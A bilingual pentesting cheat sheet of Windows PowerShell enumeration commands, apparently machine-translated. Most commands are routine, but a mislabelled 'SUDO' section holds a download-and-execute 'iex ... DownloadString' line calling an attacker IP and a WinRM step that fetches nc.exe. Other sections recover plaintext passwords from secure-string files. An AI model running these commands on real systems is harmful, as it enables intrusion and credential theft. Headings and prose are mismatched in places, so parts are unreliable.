### Get-PSDrive

The `Get-PSDrive` command allows you to retrieve information about all the drives available on the system, including local drives, network drives, and mapped drives.

`Get-PSDrive`命令允许您检索有关系统上所有可用驱动器的信息，包括本地驱动器、网络驱动器和映射驱动器。

```powershell
Get-PSDrive
```

### Get-Volume

The `Get-Volume` command provides information about the volumes on the system, including drive letters, file system types, and sizes.

`Get-Volume`命令提供有关系统上卷的信息，包括驱动器字母、文件系统类型和大小。

```powershell
Get-Volume
```

### Get-WmiObject

The `Get-WmiObject` command allows you to query the WMI (Windows Management Instrumentation) database to retrieve information about the connected drives.

`Get-WmiObject`命令允许您查询WMI（Windows管理规范）数据库，以检索有关连接的驱动器的信息。

```powershell
Get-WmiObject -Class Win32_LogicalDisk
```

These commands can help you identify and access other connected drives on a Windows system, providing you with additional opportunities for exploration and exploitation.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### 回收站

The Recycle Bin is a feature in Windows that allows users to temporarily store deleted files and folders. When a file or folder is deleted, it is moved to the Recycle Bin instead of being permanently deleted from the system. This provides a safety net for users in case they accidentally delete something and need to restore it.

The Recycle Bin can be accessed by double-clicking on its icon on the desktop or by opening the File Explorer and navigating to the Recycle Bin folder. Once inside the Recycle Bin, users can browse through the deleted files and folders and choose to restore them to their original location or permanently delete them.

It is important to note that the Recycle Bin has a storage limit, and once it reaches its maximum capacity, older files will be automatically deleted to make room for new ones. Therefore, it is recommended to regularly empty the Recycle Bin to free up disk space.

In a pentesting scenario, the Recycle Bin can be a valuable source of information. Deleted files may still contain sensitive data that can be recovered and used for further exploitation. Tools like `Recuva` can be used to recover deleted files from the Recycle Bin or even from a formatted disk.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## 域名侦察

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## 用户
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## 将安全字符串转换为明文

In some cases, you may come across a secure string in PowerShell that you need to convert to plaintext. This can be useful when you need to retrieve a password or other sensitive information stored as a secure string. Here's how you can do it:

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$plaintext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

The above code snippet demonstrates how to convert a secure string to plaintext. First, we create a secure string using the `ConvertTo-SecureString` cmdlet, specifying the desired plaintext value. Then, we use the `[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR` method to convert the secure string to a BSTR (Basic String) representation. Finally, we use the `[System.Runtime.InteropServices.Marshal]::PtrToStringAuto` method to convert the BSTR to plaintext.

Keep in mind that converting a secure string to plaintext should be done with caution, as it can expose sensitive information. Make sure to handle the plaintext data securely and avoid storing it in plain text for an extended period of time.
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
或者直接从XML解析：
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

SUDO 是一种在 Linux 和 Unix 系统上使用的命令，允许普通用户以超级用户的身份执行特权命令。这对于系统管理员来说非常有用，因为它允许他们在不完全切换到 root 用户的情况下执行特权操作。

在使用 SUDO 时，用户需要输入自己的密码来验证身份。一旦验证成功，用户就可以执行被授权的命令。SUDO 还可以配置为仅允许特定用户或用户组执行特权命令。

以下是一些常用的 SUDO 命令：

- `sudo -l`：列出当前用户可以执行的特权命令。
- `sudo -u <username> <command>`：以指定用户的身份执行命令。
- `sudo su`：切换到超级用户（root）。
- `sudo visudo`：编辑 SUDO 配置文件。

在进行渗透测试时，SUDO 可能是一个有用的目标，因为它可能会导致特权升级。通过查找 SUDO 配置文件中的错误配置或者利用已知的漏洞，攻击者可能能够以 root 用户的身份执行命令，从而完全控制目标系统。

要了解更多关于 SUDO 的信息，可以参考官方文档或者其他相关资源。
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## 用户组

User groups are a fundamental aspect of Windows security. They are used to organize and manage user accounts, as well as to assign permissions and access rights to resources.

### Built-in Groups

Windows comes with several built-in groups that have predefined permissions and access rights. These groups include:

- Administrators: This group has full control over the system and can perform any administrative task.
- Users: This group includes all standard user accounts.
- Guests: This group is intended for temporary or guest accounts with limited privileges.
- Power Users: This group has some administrative privileges but is restricted from performing certain tasks.
- Backup Operators: Members of this group can perform backup and restore operations on the system.
- Remote Desktop Users: This group is granted permission to access the system remotely using Remote Desktop.
- Network Configuration Operators: Members of this group can manage network configuration settings.
- Print Operators: Members of this group can manage printers and print queues.
- Event Log Readers: Members of this group can read event logs.

### Creating and Managing Groups

In addition to the built-in groups, you can also create your own custom groups to suit your specific needs. To create a group, you can use the `New-LocalGroup` cmdlet in PowerShell.

```powershell
New-LocalGroup -Name "MyGroup" -Description "This is my custom group"
```

To manage group membership, you can use the `Add-LocalGroupMember` and `Remove-LocalGroupMember` cmdlets.

```powershell
Add-LocalGroupMember -Group "MyGroup" -Member "User1"
Remove-LocalGroupMember -Group "MyGroup" -Member "User2"
```

### Group Policy

Group Policy is a powerful tool that allows you to manage and enforce security settings across multiple systems in a domain. It can be used to configure group membership, permissions, and other security-related settings.

To configure Group Policy, you can use the `gpedit.msc` command to open the Group Policy Editor. From there, you can navigate to the desired policy settings and make the necessary changes.

### Conclusion

Understanding and effectively managing user groups is essential for maintaining a secure Windows environment. By properly assigning permissions and access rights, you can ensure that users have the appropriate level of access to resources while minimizing the risk of unauthorized access.
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## 剪贴板

The clipboard is a temporary storage area in the computer's memory that allows you to copy and paste text, images, and other data between different applications or within the same application. It is a useful feature that simplifies the process of transferring information.

In PowerShell, you can interact with the clipboard using the `Get-Clipboard` and `Set-Clipboard` cmdlets. 

The `Get-Clipboard` cmdlet retrieves the contents of the clipboard and outputs it to the console. You can also assign the output to a variable for further processing.

The `Set-Clipboard` cmdlet allows you to set the contents of the clipboard with a specified value. This value can be a string, an object, or the output of a command.

Here are some examples of how you can use these cmdlets:

- To retrieve the contents of the clipboard and display them in the console:
```powershell
Get-Clipboard
```

- To assign the contents of the clipboard to a variable:
```powershell
$clipboardContent = Get-Clipboard
```

- To set the contents of the clipboard with a string:
```powershell
Set-Clipboard -Value "Hello, world!"
```

- To set the contents of the clipboard with the output of a command:
```powershell
Get-Process | Set-Clipboard
```

Remember that the clipboard is a temporary storage area, and its contents are lost when you restart your computer or copy new data to it.
```powershell
Get-Clipboard
```
## 进程

Processes are running instances of programs on a computer. In Windows, processes can be managed and manipulated using PowerShell commands. Here are some basic PowerShell commands for working with processes:

### Get-Process

The `Get-Process` command is used to retrieve information about running processes on a Windows system. It provides details such as the process ID (PID), name, CPU usage, and memory usage.

```powershell
Get-Process
```

### Start-Process

The `Start-Process` command is used to start a new process. It can be used to launch applications or execute scripts.

```powershell
Start-Process -FilePath "C:\path\to\application.exe"
```

### Stop-Process

The `Stop-Process` command is used to terminate a running process. It requires the process ID (PID) as input.

```powershell
Stop-Process -ID 1234
```

### Wait-Process

The `Wait-Process` command is used to wait for a process to exit before continuing with the script. It requires the process ID (PID) as input.

```powershell
Wait-Process -ID 1234
```

### Invoke-Command

The `Invoke-Command` command is used to run commands on remote computers. It can be used to manage processes on remote systems.

```powershell
Invoke-Command -ComputerName "RemoteComputer" -ScriptBlock { Get-Process }
```

These are just a few examples of the PowerShell commands that can be used to manage processes. PowerShell provides a wide range of commands and options for working with processes, allowing for advanced process manipulation and automation.
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## 服务

### PowerShell Remoting

PowerShell Remoting 允许在远程系统上执行 PowerShell 命令。它可以用于在远程系统上执行命令、获取远程系统的信息以及在远程系统上部署脚本。

#### 启用 PowerShell Remoting

要启用 PowerShell Remoting，需要在目标系统上运行以下命令：

```powershell
Enable-PSRemoting -Force
```

#### 连接到远程系统

要连接到远程系统，可以使用以下命令：

```powershell
Enter-PSSession -ComputerName <远程系统的名称或 IP 地址> -Credential <凭据>
```

#### 在远程系统上执行命令

要在远程系统上执行命令，可以使用以下命令：

```powershell
Invoke-Command -ComputerName <远程系统的名称或 IP 地址> -ScriptBlock { <要执行的命令> }
```

### Windows Service Hardening

Windows 服务硬化是一种通过配置和限制 Windows 服务的行为来增强系统安全性的方法。

#### 禁用不必要的服务

禁用不必要的服务可以减少系统的攻击面。可以使用以下命令来禁用服务：

```powershell
Set-Service -Name <服务名称> -StartupType Disabled
```

#### 配置服务启动类型

配置服务的启动类型可以限制服务的启动方式。可以使用以下命令来配置服务的启动类型：

```powershell
Set-Service -Name <服务名称> -StartupType <启动类型>
```

其中，启动类型可以是以下之一：

- Automatic：服务将在系统启动时自动启动。
- Manual：服务需要手动启动。
- Disabled：服务被禁用，无法启动。

#### 限制服务的权限

限制服务的权限可以防止服务滥用系统权限。可以使用以下命令来限制服务的权限：

```powershell
Set-Service -Name <服务名称> -RequiredPrivileges <权限列表>
```

其中，权限列表是一个以逗号分隔的权限名称列表。

#### 监视服务状态

监视服务状态可以及时发现异常行为。可以使用以下命令来监视服务状态：

```powershell
Get-Service -Name <服务名称>
```

### Windows Firewall

Windows 防火墙是一种用于保护系统免受网络攻击的软件防火墙。

#### 启用 Windows 防火墙

要启用 Windows 防火墙，可以使用以下命令：

```powershell
Set-NetFirewallProfile -Profile <配置文件名称> -Enabled True
```

其中，配置文件名称可以是以下之一：

- Domain：域网络配置文件。
- Private：专用网络配置文件。
- Public：公共网络配置文件。

#### 配置防火墙规则

配置防火墙规则可以限制进出系统的网络流量。可以使用以下命令来配置防火墙规则：

```powershell
New-NetFirewallRule -DisplayName <规则名称> -Direction <流量方向> -Action <动作> -Protocol <协议> -LocalPort <本地端口> -RemoteAddress <远程地址> -Enabled True
```

其中，流量方向可以是以下之一：

- Inbound：进入系统的流量。
- Outbound：离开系统的流量。

动作可以是以下之一：

- Allow：允许流量通过。
- Block：阻止流量。

协议可以是以下之一：

- TCP：传输控制协议。
- UDP：用户数据报协议。

本地端口和远程地址可以是具体的端口号和 IP 地址，也可以是通配符。

#### 监视防火墙状态

监视防火墙状态可以及时发现异常网络流量。可以使用以下命令来监视防火墙状态：

```powershell
Get-NetFirewallProfile -Profile <配置文件名称>
```
```
Get-Service
```
## 从安全字符串中获取密码

在进行渗透测试时，我们经常需要从安全字符串中获取密码。安全字符串是一种加密的形式，用于存储敏感信息，如密码。在Windows中，我们可以使用PowerShell来提取安全字符串中的密码。

以下是从安全字符串中获取密码的步骤：

1. 打开PowerShell控制台。
2. 使用以下命令将安全字符串转换为普通字符串：

```powershell
$secureString = ConvertTo-SecureString -String "安全字符串" -AsPlainText -Force
```

3. 使用以下命令将安全字符串转换为明文密码：

```powershell
$plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

现在，您可以使用`$plainTextPassword`变量来访问从安全字符串中提取的密码。

请注意，从安全字符串中提取密码可能会导致安全风险，因为密码将以明文形式存储在内存中。因此，在使用完密码后，请务必将其从内存中清除。

这是从安全字符串中获取密码的基本方法。在实际渗透测试中，您可能需要使用其他技术和工具来获取密码。
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## 定时任务

Scheduled tasks are a powerful feature in Windows that allow you to automate the execution of scripts or programs at specific times or intervals. As a pentester, understanding how to manipulate and exploit scheduled tasks can be extremely valuable.

定时任务是Windows中的一个强大功能，它允许您在特定时间或间隔内自动执行脚本或程序。作为一名渗透测试人员，了解如何操作和利用定时任务可以非常有价值。

### Viewing Scheduled Tasks

### 查看定时任务

To view the list of scheduled tasks on a Windows system, you can use the `schtasks` command. This command provides a detailed overview of all the scheduled tasks, including their names, triggers, and actions.

要查看Windows系统上的定时任务列表，可以使用`schtasks`命令。该命令提供了所有定时任务的详细概述，包括它们的名称、触发器和操作。

```plaintext
schtasks /query /fo LIST /v
```

### Creating Scheduled Tasks

### 创建定时任务

As a pentester, you may want to create a scheduled task to maintain persistence on a compromised system. To create a scheduled task, you can use the `schtasks` command with the `/create` option. You will need administrative privileges to create a scheduled task.

作为一名渗透测试人员，您可能希望在被入侵的系统上创建一个定时任务以保持持久性。要创建定时任务，可以使用带有`/create`选项的`schtasks`命令。您需要管理员权限才能创建定时任务。

```plaintext
schtasks /create /sc <schedule> /tn <task_name> /tr <command> /ru <username> /rp <password>
```

- `<schedule>`: Specifies the schedule for the task (e.g., `MINUTE`, `HOURLY`, `DAILY`, `WEEKLY`, `MONTHLY`).
- `<task_name>`: Specifies the name of the task.
- `<command>`: Specifies the command or script to be executed.
- `<username>`: Specifies the username under which the task will run.
- `<password>`: Specifies the password for the specified username.

- `<schedule>`: 指定任务的计划（例如，`MINUTE`，`HOURLY`，`DAILY`，`WEEKLY`，`MONTHLY`）。
- `<task_name>`: 指定任务的名称。
- `<command>`: 指定要执行的命令或脚本。
- `<username>`: 指定任务将在其下运行的用户名。
- `<password>`: 指定指定用户名的密码。

### Modifying Scheduled Tasks

### 修改定时任务

To modify an existing scheduled task, you can use the `schtasks` command with the `/change` option. This allows you to update the schedule, command, or other properties of the task.

要修改现有的定时任务，可以使用带有`/change`选项的`schtasks`命令。这样可以更新任务的计划、命令或其他属性。

```plaintext
schtasks /change /tn <task_name> /tr <new_command>
```

- `<task_name>`: Specifies the name of the task to be modified.
- `<new_command>`: Specifies the new command or script to be executed.

- `<task_name>`: 指定要修改的任务的名称。
- `<new_command>`: 指定要执行的新命令或脚本。

### Deleting Scheduled Tasks

### 删除定时任务

To delete a scheduled task, you can use the `schtasks` command with the `/delete` option.

要删除定时任务，可以使用带有`/delete`选项的`schtasks`命令。

```plaintext
schtasks /delete /tn <task_name> /f
```

- `<task_name>`: Specifies the name of the task to be deleted.
- `/f`: Forces the deletion of the task without confirmation.

- `<task_name>`: 指定要删除的任务的名称。
- `/f`: 强制删除任务，无需确认。

### Disabling Scheduled Tasks

### 禁用定时任务

To disable a scheduled task, you can use the `schtasks` command with the `/change` option and set the `/disable` flag.

要禁用定时任务，可以使用带有`/change`选项的`schtasks`命令，并设置`/disable`标志。

```plaintext
schtasks /change /tn <task_name> /disable
```

- `<task_name>`: Specifies the name of the task to be disabled.

- `<task_name>`: 指定要禁用的任务的名称。

### Enabling Scheduled Tasks

### 启用定时任务

To enable a disabled scheduled task, you can use the `schtasks` command with the `/change` option and set the `/enable` flag.

要启用已禁用的定时任务，可以使用带有`/change`选项的`schtasks`命令，并设置`/enable`标志。

```plaintext
schtasks /change /tn <task_name> /enable
```

- `<task_name>`: Specifies the name of the task to be enabled.

- `<task_name>`: 指定要启用的任务的名称。
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
## 网络

### 接口

#### PowerShell命令

```powershell
Get-NetAdapter
```

此命令用于获取系统上的所有网络适配器的详细信息。

#### 输出示例

```plaintext
Name                      InterfaceDescription                    ifIndex Status       MacAddress             LinkSpeed
----                      --------------------                    ------- ------       ----------             ---------
Ethernet                  Intel(R) Ethernet Connection (2) I219-V      12 Up           00-11-22-33-44-55       1 Gbps
Wi-Fi                     Intel(R) Dual Band Wireless-AC 8265          13 Up           66-77-88-99-AA-BB       300 Mbps
```

#### 解释

- `Name`：适配器的名称。
- `InterfaceDescription`：适配器的描述。
- `ifIndex`：适配器的索引。
- `Status`：适配器的状态。
- `MacAddress`：适配器的物理地址。
- `LinkSpeed`：适配器的链接速度。
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 防火墙

A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware devices or software programs.

防火墙是一种网络安全设备，根据预定的安全规则监控和控制进出网络的流量。它充当可信任的内部网络和不可信任的外部网络（如互联网）之间的屏障。防火墙可以作为硬件设备或软件程序实现。

Firewalls can be configured to allow or block specific types of traffic based on various criteria, such as source IP address, destination IP address, port number, and protocol. They help protect networks from unauthorized access, malicious attacks, and data breaches.

防火墙可以根据各种标准（如源IP地址、目标IP地址、端口号和协议）配置允许或阻止特定类型的流量。它们有助于保护网络免受未经授权的访问、恶意攻击和数据泄露的影响。

Firewalls are an essential component of network security and are commonly used in both home and enterprise environments. They provide an additional layer of defense by filtering and inspecting network traffic to ensure that only legitimate and authorized traffic is allowed to pass through.

防火墙是网络安全的重要组成部分，广泛应用于家庭和企业环境。它们通过过滤和检查网络流量，提供了额外的防御层，以确保只有合法和授权的流量被允许通过。

In addition to traditional firewalls, there are also host-based firewalls that are installed on individual computers or servers. These firewalls provide an added layer of protection by controlling network traffic at the host level.

除了传统的防火墙外，还有安装在个人计算机或服务器上的主机防火墙。这些防火墙通过在主机级别控制网络流量，提供了额外的保护层。

It is important to properly configure and maintain firewalls to ensure their effectiveness. Regularly updating firewall rules, monitoring logs for suspicious activity, and conducting periodic security audits are essential practices for maintaining a secure network environment.

正确配置和维护防火墙非常重要，以确保其有效性。定期更新防火墙规则、监控日志以寻找可疑活动，并进行定期安全审计是维护安全网络环境的重要实践。
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### 路由

Routes are a fundamental concept in network communication. They determine how data packets are forwarded from one network to another. In the context of pentesting, understanding and manipulating routes can be crucial for gaining access to target systems.

#### Default Route

The default route, also known as the gateway of last resort, is the route that is used when there is no specific route available for a destination network. It is typically set to the IP address of the next-hop router that can forward packets to other networks.

To view the default route in Windows, you can use the `route print` command in PowerShell. This will display the routing table, which includes the default route information.

```powershell
route print
```

#### Adding Routes

As a pentester, you may need to add routes to redirect traffic through specific paths. This can be useful for bypassing firewalls or routing traffic through compromised systems.

To add a route in Windows using PowerShell, you can use the `New-NetRoute` cmdlet. Here is an example of adding a route to redirect traffic destined for the 10.10.10.0/24 network through the IP address 192.168.1.1:

```powershell
New-NetRoute -DestinationPrefix 10.10.10.0/24 -NextHop 192.168.1.1
```

#### Modifying Routes

In addition to adding routes, you may also need to modify existing routes. This can be done using the `Set-NetRoute` cmdlet in PowerShell.

For example, to change the next-hop IP address for a specific route, you can use the following command:

```powershell
Set-NetRoute -DestinationPrefix 10.10.10.0/24 -NextHop 192.168.2.1
```

#### Deleting Routes

To delete a route in Windows using PowerShell, you can use the `Remove-NetRoute` cmdlet. Here is an example of deleting a route for the 10.10.10.0/24 network:

```powershell
Remove-NetRoute -DestinationPrefix 10.10.10.0/24
```

#### Conclusion

Understanding and manipulating routes is an important skill for pentesters. By adding, modifying, or deleting routes, you can control the flow of network traffic and potentially gain access to target systems.
```powershell
route print
```
### ARP

ARP（地址解析协议）是一种用于将IP地址映射到物理MAC地址的协议。在局域网中，ARP被用于确定目标设备的MAC地址，以便在数据包传输过程中正确地将数据包发送到目标设备。

ARP缓存中存储了IP地址和对应的MAC地址的映射关系。当一个设备需要发送数据包到另一个设备时，它首先检查自己的ARP缓存。如果缓存中没有目标设备的MAC地址，那么设备将发送一个ARP请求广播，询问局域网中的其他设备，以获取目标设备的MAC地址。

ARP欺骗是一种利用ARP协议的漏洞进行攻击的技术。攻击者可以发送虚假的ARP响应，欺骗其他设备将数据包发送到攻击者控制的设备上。这种攻击可以用于中间人攻击、网络嗅探和会话劫持等恶意活动。

为了防止ARP欺骗攻击，可以采取一些基本的防御措施，如使用静态ARP条目、启用ARP检测和防御工具，以及定期清除ARP缓存。这些措施可以帮助保护网络免受ARP欺骗攻击的影响。
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### 主机

The `hosts` file is a plain text file used by operating systems to map hostnames to IP addresses. It is commonly used to block or redirect certain websites or to override DNS settings. In Windows, the `hosts` file is located at `C:\Windows\System32\drivers\etc\hosts`.

`hosts`文件是操作系统用来将主机名映射到IP地址的纯文本文件。它通常用于阻止或重定向特定的网站，或者用于覆盖DNS设置。在Windows中，`hosts`文件位于`C:\Windows\System32\drivers\etc\hosts`。
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Ping

Ping是一种用于测试网络连接的常用工具。它通过向目标主机发送ICMP Echo请求并等待响应来检查主机的可达性和响应时间。Ping命令通常用于诊断网络问题和测量网络延迟。

使用Ping命令非常简单。只需在命令行中输入`ping`，后跟目标主机的IP地址或域名。例如：

```
ping 192.168.0.1
```

Ping命令将发送一系列的ICMP Echo请求，并显示每个请求的响应时间。它还提供有关丢包率和往返时间的统计信息。

Ping命令还支持一些可选参数，例如：

- `-t`：持续发送ICMP Echo请求，直到手动停止。
- `-n`：指定要发送的ICMP Echo请求的数量。
- `-l`：指定要发送的ICMP Echo请求的数据包大小。

Ping命令对于确定网络连接是否正常以及诊断网络问题非常有用。它还可以用于测试主机的响应时间，以评估网络性能。
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

SNMP（Simple Network Management Protocol）是一种用于管理和监控网络设备的协议。它允许管理员通过发送和接收消息来获取有关设备的信息，例如系统状态、网络流量和错误报告。SNMP使用基于UDP的传输协议，并使用MIB（Management Information Base）来定义设备上可用的信息。攻击者可以利用SNMP协议来收集有关目标网络设备的信息，例如操作系统版本、开放的端口和配置设置。这些信息可以帮助攻击者识别潜在的漏洞和攻击路径。
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **将SDDL字符串转换为可读格式**

To convert the SDDL (Security Descriptor Definition Language) string into a readable format, you can use the `ConvertFrom-SddlString` cmdlet in PowerShell. This cmdlet allows you to convert the SDDL string into an object that can be easily understood.

```powershell
$sddlString = "SDDL_STRING_HERE"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

Replace `SDDL_STRING_HERE` with the actual SDDL string you want to convert. After running the above code, the PowerShell console will display the converted security descriptor object, which provides a more human-readable representation of the SDDL string.

## **将SDDL字符串转换为可读格式**

要将SDDL（安全描述符定义语言）字符串转换为可读格式，可以使用PowerShell中的`ConvertFrom-SddlString` cmdlet。该cmdlet允许您将SDDL字符串转换为易于理解的对象。

```powershell
$sddlString = "SDDL_STRING_HERE"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

将`SDDL_STRING_HERE`替换为要转换的实际SDDL字符串。运行上述代码后，PowerShell控制台将显示转换后的安全描述符对象，该对象提供了SDDL字符串的更易读的表示形式。
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-